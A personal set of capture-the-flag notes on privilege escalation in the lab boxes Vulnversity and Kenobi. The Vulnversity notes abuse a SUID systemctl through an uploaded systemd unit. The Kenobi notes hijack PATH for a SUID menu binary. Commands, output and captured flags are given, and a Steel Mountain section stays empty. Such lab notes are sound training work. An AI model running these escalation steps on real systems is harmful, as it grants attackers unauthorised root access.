# Penetration Test Path2Glory
Following some notes I took facing some challange\box, so these are not write-up\walkthrough, often just an aspect is covered (e.g. privilege escalation). I took the notes since I discovered new tactics (sometime reading someone else blog or article) that I didn't know or even worse, I was not able to think :)

## Vulnversity
### Priv escalation
Find SUID files on the victim
  
    find / -perm -u=s -type f 2>/dev/null
    /usr/bin/newuidmap
    ...
    /bin/systemctl
     ...

On the attacker create the following service configuration file as service01.phtml

    [Unit]
    Description=Service 01
    
    [Service]
    Type=simple
    User=root
    ExecStart=/bin/bash -c 'cat /root/root.txt'
    
    [Install]
    WantedBy=multi-user.target

Upload the file using the form to the victim, (http://10.10.13.154:3333/internal/) then execute the following steps

    cd /var/www/html/internal/uploads
    mv service01.phtml service01.service
    /bin/systemctl enable /var/www/html/internal/uploads/service01.service
      Created symlink from /etc/systemd/system/multi-user.target.wants/service01.service to /var/www/html/internal/uploads/service01.service.
      Created symlink from /etc/systemd/system/service01.service to /var/www/html/internal/uploads/service01.service.
Them start the service

    /bin/systemctl status service01
Check the execution to get the flag: a58ff8579f0a9270368d33a9966c7fd5

    /bin/systemctl status service01
    * service01.service - Service 01
       Loaded: loaded (/var/www/html/internal/uploads/service01.service; enabled; vendor preset: enabled)
       Active: inactive (dead) since Mon 2024-04-29 06:38:29 EDT; 1min 4s ago
      Process: 12889 ExecStart=/bin/bash -c cat /root/root.txt (code=exited, status=0/SUCCESS)
     Main PID: 12889 (code=exited, status=0/SUCCESS)
    
    Apr 29 06:38:29 vulnuniversity systemd[1]: Started Service 01.
    Apr 29 06:38:29 vulnuniversity bash[12889]: a58ff8579f0a9270368d33a9966c7fd5

## Kenobi
### Priv escalation
Search SUID file

    find / -perm -u=s -type f 2>/dev/null
    ...
    /usr/bin/menu
    ...

Check readable strings inside the file

    strings /usr/bin/menu 
      []A\A]A^A_
      ***************************************
      1. status check
      2. kernel version
      3. ifconfig
      ** Enter your choice :
      curl -I localhost
      uname -r
      ifconfig
       Invalid choice
      ;*3$"

The menu calls 3 commands: curl, kernel, ifconfig, without specifing the full path. This allows us to create a malicious version of once of the executed commands, e.g. ifconfig.
Inspecting the PATH enviroment variable:

    echo $PATH
      /home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
We can see that current user bin directory is in the PATH, so we can just create our malicious version of ifconfig inside the user's home bin directory:

     pwd
      /home/kenobi
    mkdir bin
    cd bin
    echo "cat /root/root.txt" > ifconfig
    chmod ugo+x ifconfig 
Executing the command we get an access error since we don't have the permission to read the flag:

      ifconfig 
      cat: /root/root.txt: Permission denied
    
But if we call it using the menu command interface we get the flag:

    kenobi@kenobi:~$ menu
    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :3
    177b3cd8562289f37382721c28381f02

## Steel Mountain

    
    



